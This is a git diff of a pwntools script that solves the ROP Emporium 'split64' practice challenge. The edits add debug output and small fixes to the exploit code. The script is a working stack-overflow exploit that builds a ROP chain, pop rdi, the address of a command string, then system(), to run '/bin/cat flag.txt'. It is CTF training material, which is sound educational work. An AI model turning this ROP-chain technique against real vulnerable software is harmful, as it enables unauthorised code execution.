@@ -2,7 +2,7 @@
 
 # ROP Emporium - split64 solution using pwntools library
 # Link: https://ropemporium.com/challenge/ret2win.html
-# Created by dilldylanpickle on 4-12-2023
+# Created by dilldylanpickle on 4-2-2023
 # GitHub: https://github.com/dilldylanpickle
 #
 # Dependencies:
@@ -19,27 +19,35 @@ def exploit(binary_path):
     elf = context.binary = ELF(binary_path)
     io = process(elf.path)
 
+    # Load the cached gadgets for the binary
+    rop = ROP(elf)
+
     # Get the address of the system function
     system_addr = elf.symbols["system"]
+    print("[DEBUG] The address of system() is " + str(hex(system_addr)))
 
     # Use ROPgadget to find the address of a "pop rdi ; ret" instruction
-    rop = ROP(elf)
     pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret']).address
+    print("[DEBUG] The address of ROP gadget pop rdi ; ret is " + str(hex(pop_rdi)))
     ret = rop.find_gadget(['ret'])[0]
+    print("[DEBUG] The address of ROP gadget ret is " + str(hex(ret)))
 
-    # Find the offset of the "/bin/cat flag.txt" string
+    # Find the address of the "/bin/cat flag.txt" string
     string_addr = next(elf.search(b'/bin/cat flag.txt'))
+    print("[DEBUG] The address of the /bin/cat flag.txt string is " + str(hex(string_addr)))
 
     # Get the offset by calling the find_offset function
     offset = find_offset(binary_path)
+    print("[DEBUG] The offset calculated overwrite RIP is " + str(offset) + " bytes")
 
     # Construct the payload
-    payload = b'A' * offset
+    payload = b'\x41' * offset
     payload += p64(pop_rdi)
     payload += p64(string_addr)
     payload += p64(ret)
     payload += p64(system_addr)
     payload += p64(0x0)
+    print("[DEBUG] The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
 
     # Send the payload and print the output
     io.sendline(payload)
